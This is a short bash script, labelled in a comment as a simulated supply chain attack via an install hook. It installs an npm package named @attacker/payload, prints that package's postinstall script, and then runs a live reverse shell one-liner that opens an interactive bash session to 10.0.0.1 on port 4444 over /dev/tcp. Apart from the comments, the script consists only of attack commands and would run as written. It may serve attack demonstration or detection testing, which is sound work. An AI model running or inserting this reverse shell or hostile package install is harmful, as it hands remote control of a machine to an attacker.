#!/bin/bash
# Simulated supply chain attack via install hook

# Step 1: Package install
npm install @attacker/payload

# Step 2: Postinstall hook references
cat node_modules/@attacker/payload/postinstall.js

# Step 3: Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
